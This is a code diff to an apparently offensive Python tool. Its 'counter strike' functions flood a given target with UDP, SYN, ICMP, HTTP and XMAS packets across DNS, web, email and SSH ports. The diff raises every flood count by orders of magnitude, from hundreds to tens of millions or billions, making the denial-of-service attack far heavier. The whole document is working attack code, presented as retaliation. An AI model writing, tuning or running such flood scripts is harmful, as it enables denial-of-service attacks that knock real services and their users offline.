@@ -7,21 +7,21 @@ def full_scale_counter_strike(target):
     counter_strike_helper.attack_UDP("UDP-Mix",target,53,300) # DNS
     counter_strike_helper.attack_UDP("UDP-Mix", target, 443, 300) # QUIC
     print("Performing SYN Flood")
-    counter_strike_helper.synflood(target,80,200) # HTTP
-    counter_strike_helper.synflood(target, 443, 200) # HTTPS
-    counter_strike_helper.synflood(target, 25, 200) # Email
-    counter_strike_helper.synflood(target, 587, 200) # Email
-    counter_strike_helper.synflood(target, 465, 200) # Email
-    counter_strike_helper.synflood(target, 143, 200) # Email
-    counter_strike_helper.synflood(target, 993, 200) # Email
-    counter_strike_helper.synflood(target, 22, 200) # SSH
+    counter_strike_helper.synflood(target,80,20000000) # HTTP
+    counter_strike_helper.synflood(target, 443, 20000000) # HTTPS
+    counter_strike_helper.synflood(target, 25, 20000000) # Email
+    counter_strike_helper.synflood(target, 587, 20000000) # Email
+    counter_strike_helper.synflood(target, 465, 20000000) # Email
+    counter_strike_helper.synflood(target, 143, 20000000) # Email
+    counter_strike_helper.synflood(target, 993, 20000000) # Email
+    counter_strike_helper.synflood(target, 22, 20000000) # SSH
     print("Performing ICMP Flood")
-    counter_strike_helper.icmpflood(target,200) # ICMP
+    counter_strike_helper.icmpflood(target,200000000) # ICMP
     print("Performing HTTP Flood")
-    counter_strike_helper.attack_http_flood(target,80,30000) # http flood
+    counter_strike_helper.attack_http_flood(target,80,3000000000) # http flood
     print("Performing XMAS Flood")
     for port in range(0,1024): # xmas flood
-        counter_strike_helper.xmasflood(target,port,50)
+        counter_strike_helper.xmasflood(target,port,5000000)
 
 
 def fast_counter_strike(target):
@@ -29,14 +29,14 @@ def fast_counter_strike(target):
     print("Performing UDP Attack")
     counter_strike_helper.attack_UDP("UDP-Mix", target, 53, 120)  # DNS
     print("Performing SYN Flood")
-    counter_strike_helper.synflood(target, 80, 100)  # HTTP
-    counter_strike_helper.synflood(target, 443, 100)  # HTTPS
-    counter_strike_helper.synflood(target, 25, 100)  # Email
-    counter_strike_helper.synflood(target, 587, 100)  # Email
+    counter_strike_helper.synflood(target, 80, 10000000)  # HTTP
+    counter_strike_helper.synflood(target, 443, 10000000)  # HTTPS
+    counter_strike_helper.synflood(target, 25, 10000000)  # Email
+    counter_strike_helper.synflood(target, 587, 10000000)  # Email
     print("Performing ICMP Flood")
-    counter_strike_helper.icmpflood(target, 80) # ICMP
+    counter_strike_helper.icmpflood(target, 80000000) # ICMP
     print("Performing HTTP Flood")
-    counter_strike_helper.attack_http_flood(target, 80, 10000) # http flood
+    counter_strike_helper.attack_http_flood(target, 80, 1000000000) # http flood
 
 
 if __name__ == "__main__":
